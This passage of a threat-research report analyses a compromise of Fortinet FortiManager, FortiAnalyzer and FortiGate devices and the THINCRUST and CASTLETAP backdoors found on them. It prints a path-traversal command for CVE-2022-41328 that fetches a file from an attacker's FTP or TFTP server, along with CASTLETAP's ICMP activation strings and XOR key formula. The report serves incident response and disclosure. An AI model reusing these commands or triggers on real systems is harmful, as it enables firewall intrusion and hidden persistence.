style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eID\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e1\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eExecute the command line stored in 'key'\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e2\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eWrite the contents of the HTTP request to the file stored in 'key'. The contents are RC4 encrypted\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e3\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eRead the contents of the file stored in 'key' and transfer the contents RC4 encrypted to the client\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 1: get_device_info backdoor capabilities\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eWhile most files in \u003ccode\u003eviews.py\u003c/code\u003e had the \u003ccode\u003e@login_required\u003c/code\u003e decorator applied to them [decorators are any functions (Syntax to call decorator: @) that extend the behavior of another function without explicitly modifying the code], the malicious function \u003ccode\u003eget_device_info\u003c/code\u003e utilized the Django python module native to the system to add a \u003ccode\u003e@csrf_exempt\u003c/code\u003e decorator to the function as seen in Figure 5. This means that the POST request to the malicious API call did not require a login or CSRF token to successfully run.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 5: @login_required vs @csrf_exempt decorators\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png 746w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png 746w"," 746px,  746px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-fortinet-malware-ecosystem_ymlk.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eMandiant identified that a variant of this malicious API call was also present on a FortiAnalyzer device. While the backdoor function in \u003ccode\u003eviews.py\u003c/code\u003e, \u003ccode\u003eget_device_info\u003c/code\u003e, was the same as FortiManager, the API call used to access the backdoor was changed to \u003ccode\u003e/p/utils/fortigate_syslog_send\u003c/code\u003e on the FortiAnalyzer device, as seen in Figure 6.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 6: FortiAnalyzer variant of urls.py: fortigate_syslog_send\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png 718w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png 718w"," 718px,  718px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-fortinet-malware-ecosystem_tjji.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003ch3\u003eExploitation of CVE-2022-41328 on FortiGate Devices\u003c/h3\u003e\n\u003cp\u003eAfter persistence was established across the FortiManager and FortiAnalyzer devices with the THINCRUST backdoor, the threat actor deployed FortiManager scripts to multiple FortiGate firewalls. This activity was logged in the FortiGate elog as seen in Figure 7.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003evd\u003d\u0026quot;root\u0026quot;\r\ntype\u003d\u0026quot;event\u0026quot;\r\nsubtype\u003d\u0026quot;system\u0026quot;\r\nlevel\u003d\u0026quot;notice\u0026quot; logdesc\u003d\u0026quot;Upload and run a script\u0026quot;\r\nuser\u003d”Fortimanager_Access”\r\nui\u003d\u0026quot;fgfmd\u0026quot;\r\nmsg\u003d\u0026quot; User Fortimanager_Access via fgfmd upload and run script: \u0026lt;script_id\u0026gt; -- OK\u0026quot;\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 7: FGFM script deployment log entry\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eThe threat actor deleted these FortiManager scripts from the FortiManager device before they could be recovered for analysis, but correlation of multiple event log types show that the scripts took advantage of a path traversal vulnerability (CVE-2022-41328). The vulnerability was exploited by the threat actor using the command \u003ccode\u003eexecute wireless-controller hs20-icon upload-icon\u003c/code\u003e (as seen in Figure 8). This command allowed the threat actor to overwrite legitimate files in a normally restricted system directory. Normally, the \u003ccode\u003eexecute wireless-controller hs20-icon upload-icon\u003c/code\u003e command is used to upload .ico files (icon files) from a server to a FortiGate firewall using the File Transfer Protocol (“FTP”) or Trivial File Transfer Protocol (“TFTP”), where they can be used in HotSpot 2.0 Online Sign-Up (OSU) portals. HotSpot 2.0 is a technology which allows for devices to seamlessly switch between cellular data and public Wi-Fi.\u003c/p\u003e\n\u003cp\u003eHowever, the \u003ccode\u003eexecute wireless-controller hs20-icon upload-icon\u003c/code\u003e command suffered from two issues. The command did not validate the type of file being uploaded and was susceptible to a directory traversal exploit allowing a threat actor with Super Administrator privileges to upload a file smaller than 65,535 bytes to any location on the file system. This means that outside of the size constraints of the command,\u00ad\u00ad a threat actor could replace any legitimate system file on the FortiGate firewall.\u003c/p\u003e\n\u003cp\u003eSuccessful exploitation of the vulnerability (CVE-2022-41328) is not logged in FortiGate elogs. Around the time of the FortiManager script execution, the elogs recorded the threat actor’s failed attempts to overwrite the system file \u003ccode\u003e/bin/lspci\u003c/code\u003e using this exploit, seen in Figure 8.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eexecute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci \u0026lt;TA FTP Server\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 8: FortiGate elog failed command execution\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eexecute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci \u0026lt;TA TFTP Server\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFortinet confirmed the exploitation of this command was not seen prior to these events and assigned the designation CVE-2022-41328. Fortinet successfully replicated the exploit using the syntax seen in the failed command events.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eFurther supporting evidence of attempted exploitation was found in FortiGuard logs events with “\u003ccode\u003efile_transfer: TFTP.Server.Buffer.Overflow repeated X times\u003c/code\u003e” in the \u003ccode\u003emsg\u003c/code\u003e field. These events showed connections from the FortiGate firewalls to the FortiAnalyzer device, where the packet contents included the \u003ccode\u003elscpi\u003c/code\u003e directory traversal string, as seen in Figure 9. A directory traversal string with the filename \u003ccode\u003enode\u003c/code\u003e was also referenced in a similar event, which is another binary in the \u003ccode\u003e/bin/\u003c/code\u003e directory of a FortiGate 6.2.7 device, but Mandiant only observed the threat actor replacing the \u003ccode\u003elscpi\u003c/code\u003e binary successfully.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ePFBBVFRFUk5TPiAAATsuLi88L1BBVFRFUk5TPgo8VVJJPiA8L1VSST4KPEhFQURFUj4gPC9IRUFERVI+CjxCT\r\n0RZPiA8L0JPRFk+CjxQQUNLRVQ+IAABLi4vLi4vLi4vLi4vLi4vLi4vYmluL2xzcGNpAG9jdGV0ADwvUEFDS0\r\nVUPg\u003d\u003d\r\nBase 64 Decoded\r\n\u0026lt;PACKET\u0026gt; ..../../../../../../bin/lspci.octet.\u0026lt;/PACKET\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 9: IPS Sensor Logs - Attack Context Field\u003c/div\u003e\n\u003c/div\u003e\n\u003ch3\u003eSymlink to Suspected Backdoor (/bin/lspci -\u0026gt; /bin/sysctl)\u003c/h3\u003e\n\u003cp\u003eMandiant reviewed file listings from multiple FortiGate firewalls in search of modified versions of \u003ccode\u003e/bin/lspci\u003c/code\u003e based on the failed commands seen within FortiGate logs. In total, two variants of \u003ccode\u003e/bin/lspci\u003c/code\u003e were identified; a standalone version of the binary and a version which was symlinked to \u003ccode\u003e/bin/sysctl\u003c/code\u003e. Fortinet confirmed that \u003ccode\u003e/bin/lspci\u003c/code\u003e should always be a standalone binary.\u003c/p\u003e\n\u003cp\u003eFile listing entries for \u003ccode\u003e/bin/lspci\u003c/code\u003e and \u003ccode\u003e/bin/sysctl\u003c/code\u003e on the compromised FortiGate firewalls contained similar timestamps that did not align with other legitimate binaries on the FortiGate machines. Additionally, the file size for \u003ccode\u003e/bin/sysctl\u003c/code\u003e on the compromised FortiGate firewall was much larger than reported on non-compromised devices.\u003c/p\u003e\n\u003cp\u003eUnder normal circumstances, the command ‘\u003ccode\u003ediagnose hardware lscpi\u003c/code\u003e’ is used to list PCIe devices connected to the FortiGate firewall, but once the threat actor replaced the legitimate \u003ccode\u003elspci\u003c/code\u003e binary with a symlink, the diagnostic command could execute the \u003ccode\u003esysctl\u003c/code\u003e file the threat actor modified instead.\u003c/p\u003e\n\u003cp\u003eThe file listing snippets in Figure 10 and Figure 11 highlight the differences across the original and modified versions of \u003ccode\u003e/bin/lspci\u003c/code\u003e and \u003ccode\u003e/bin/sysctl\u003c/code\u003e present on the FortiGate firewalls.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eCOMPROMISED-FGT101F # fnsysctl ls -la /bin\r\n...\r\nlrwxrwxrwx    1 root     root             9 Oct 18 13:09 lldptx -\u0026gt; /bin/init\r\nlrwxrwxrwx    1 root     root             9 Oct 18 13:09 lnkmtd -\u0026gt; /bin/init\r\nlrwxrwxrwx    1 root     root            11 Oct 19 05:11 lspci -\u0026gt; /bin/sysctl\r\nlrwxrwxrwx    1 root     root             9 Oct 18 13:09 lted -\u0026gt; /bin/init\r\nlrwxrwxrwx    1 root     root             9 Oct 18 13:09 memuploadd -\u0026gt; /bin/init\r\n...\r\n-rwxr-xr-x    1 root     root       1478216 Oct 19 05:11 sysctl\r\n...\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 10: Compromised FortiGate firewall with malicious entries for /bin/lspci and /bin/sysctl\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eNON-COMPROMISED-FGT101F # fnsysctl ls -la /bin\r\n...\r\nlrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lldptx -\u0026gt; /bin/init\r\nlrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lnkmtd -\u0026gt; /bin/init\r\n-rwxr-xr-x    1 0        0       Fri Sep  2 12:07:55 2022    131736 lspci\r\nlrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 lted -\u0026gt; /bin/init\r\nlrwxrwxrwx    1 0        0       Fri Sep  2 12:07:55 2022         9 memuploadd -\u0026gt; /bin/init\r\n...\r\n-rwxr-xr-x    1 0        0       Fri Sep  2 12:07:55 2022    251480 sysctl\r\n...\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 11: Non-Compromised FortiGate firewall with legitimate entries for /bin/lspci and /bin/sysctl\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eIn addition to the differences in modification time and size, the output of the file listing command \u003ccode\u003efnsysctl ls -l /bin\u003c/code\u003e displayed multiple fields in different formats and order. This is likely due to the threat actor replacing \u003ccode\u003e/bin/sysctl\u003c/code\u003e and therefore changing the shell functionality on the FortiGate firewall. Changes made to the FortiOS file system are not persistent, so the files were unable to be recovered for analysis.\u003c/p\u003e\n\u003cp\u003eBy default, Fortinet devices running FortiOS have an archive on disk labelled \u003ccode\u003erootfs.gz\u003c/code\u003e within the \u003ccode\u003e/data/\u003c/code\u003e partition. Upon boot, this file is mounted as the root filesystem. This means if modifications are made to the mounted image, the changes will not be persistent unless they are written to the \u003ccode\u003erootfs.gz\u003c/code\u003e archive. FortiGate firewalls do not support files being exported from the mounted filesystem during runtime. Since the modifications made to \u003ccode\u003e/bin/lspci\u003c/code\u003e and \u003ccode\u003e/bin/sysctl\u003c/code\u003e were not written to the \u003ccode\u003erootfs.gz\u003c/code\u003e archive, they were not installed persistently and could not be further analyzed.\u003c/p\u003e\n\u003cp\u003eMandiant coordinated with Fortinet to obtain a forensic image of the compromised FortiGate firewalls and better identify the expected contents of the devices. Comparing the forensic image of the compromised FortiGate firewall to a known-good version, Fortinet identified a trojanized firmware that contained a persistent backdoor. Mandiant refers to the backdoor as a new malware family named CASTLETAP.\u003c/p\u003e\n\u003ch3\u003eCASTLETAP (FortiGate Firewall Backdoor)\u003c/h3\u003e\n\u003cp\u003eAnalysis on the FortiGate firewalls identified an additional malicious file \u003ccode\u003e/bin/fgfm\u003c/code\u003e. Analysis of \u003ccode\u003e/bin/fgfm\u003c/code\u003e determined it to be a passive backdoor, named CASTLETAP, that listened for a specialized ICMP packet for activation. The threat actor likely named the file ‘\u003ccode\u003efgfm\u003c/code\u003e’ in an attempt to disguise the backdoor as the legitimate service ‘\u003ccode\u003efgfmd\u003c/code\u003e’ which facilitates communication between the FortiManager and FortiGate firewalls.\u003c/p\u003e\n\u003cp\u003eOnce executed, CASTLETAP created a raw promiscuous socket to sniff network traffic. CASTLETAP then filtered and XOR decoded a 9-byte magic activation string in the payload of an ICMP echo request packet. Table 2 shows the magic strings interpreted by CASTLETAP and their resultant actions.\u003c/p\u003e\n\u003cbr\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eMagic String\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cem\u003e1qaz@WSXa\u003c/em\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eParse C2 information from ICMP payload and connect to it over SSL.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003ehpaVAj2FJ\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eKills CASTLETAP process.\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 2: CASTLETAP magic string options\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eTo decode the C2 information within the ICMP packet, a single-byte XOR key was derived from the Epoch date stamp to decrypt the payload data. This meant the encoding standard changed every day. Figure 12 show the formula that was used to calculate the XOR key.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u003cstrong\u003e((year + 1900 + month * (year + 1900)) * date) % 255\u003c/strong\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003eyear: index starting from 1900 i.e. current_year-1900\u003c/strong\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003emonth: index starting from 0\u003c/strong\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003edate: index starting from 1\u003c/strong\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 12: CASTLETAP XOR key calculation\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eTable 3 defines the payload structure of the ICMP packet expected by CASTLETAP.\u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv 